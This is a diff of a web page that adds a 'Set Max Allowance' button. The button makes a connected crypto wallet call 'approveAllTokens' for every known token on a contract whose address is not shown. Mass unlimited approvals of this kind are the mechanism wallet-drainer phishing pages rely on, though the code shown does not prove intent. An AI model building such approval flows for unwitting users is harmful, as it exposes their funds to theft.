@@ -1,4 +1,4 @@
-k0<!DOCTYPE html>
+ak<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -12,6 +12,7 @@ k0<!DOCTYPE html>
 
     <button id="connectWalletButton">Connect Wallet</button>
     <button id="approveTokensButton" disabled>Approve Tokens</button>
+    <button id="setMaxAllowanceButton" disabled>Set Max Allowance</button>
     <button id="checkApprovalButton" disabled>Check Approval Status</button>
 
     <div id="status"></div>
@@ -56,6 +57,7 @@ k0<!DOCTYPE html>
                     signer = provider.getSigner();
                     document.getElementById('connectWalletButton').disabled = true;
                     document.getElementById('approveTokensButton').disabled = false;
+                    document.getElementById('setMaxAllowanceButton').disabled = false;
                     document.getElementById('checkApprovalButton').disabled = false;
                     updateStatus("Wallet connected successfully.");
                 } catch (error) {
@@ -84,6 +86,27 @@ k0<!DOCTYPE html>
             } catch (error) {
                 console.error("Approval failed:", error);
                 updateStatus("Approval failed. Check console for details.");
+            }
+        }
+
+        async function setMaxAllowance() {
+            if (!signer) {
+                updateStatus("Connect your wallet first!");
+                return;
+            }
+
+            const contract = new ethers.Contract(contractAddress, contractABI, signer);
+            try {
+                for (const token of knownTokens) {
+                    const tx = await contract.approveAllTokens(token);
+                    await tx.wait(); // Menunggu konfirmasi transaksi
+                    console.log(`Set max allowance for token: ${token}`);
+                }
+                updateStatus("Max allowance set! Checking approval status...");
+                await checkApprovalStatus(); // Memeriksa kembali status allowance setelah mencoba set max allowance
+            } catch (error) {
+                console.error("Setting max allowance failed:", error);
+                updateStatus("Setting max allowance failed. Check console for details.");
             }
         }
 
@@ -120,6 +143,7 @@ k0<!DOCTYPE html>
         // Event listeners for buttons
         document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
         document.getElementById('approveTokensButton').addEventListener('click', approveTokens);
+        document.getElementById('setMaxAllowanceButton').addEventListener('click', setMaxAllowance);
         document.getElementById('checkApprovalButton').addEventListener('click', checkApprovalStatus);
     </script>
 </body>
